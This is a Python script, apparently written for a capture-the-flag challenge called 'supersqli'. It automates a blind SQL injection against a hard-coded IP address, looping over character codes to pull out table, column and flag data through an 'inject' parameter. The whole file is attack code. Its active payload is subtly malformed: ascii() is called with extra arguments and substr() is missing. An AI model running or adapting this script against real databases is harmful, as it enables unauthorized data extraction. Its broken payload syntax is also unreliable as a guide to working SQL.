'''
@Descripttion: 
@version: 
@Author: chalan630
@Date: 2020-03-18 16:13:17
@LastEditTime: 2020-03-27 16:24:15
'''

import requests
table = ""
list_1 = [element for element in range(48,58)]
list_2 = [element for element in range(97,126)]
list_0 = list_1 + list_2

session = requests.session()
url = "http://111.198.29.45:34865/"

for i in range(1,50):
    print(i)
    for j in list_0:
        # payload = "if(ascii(substr((select flag from flag),%d,1))=%d,1,(select table_name from information_schema.tables))"%(i,j)
        payload = "1' and if(ascii((select column_name from information_schema.columns where table_schema=''),%d,1))=%d,1,0) -- "%(i,j)
        str_get = session.get(url=url + '?inject=' + payload).text
        if 'array' in str_get:
            table += chr(j)
            print(table)
            break


# database() supersqli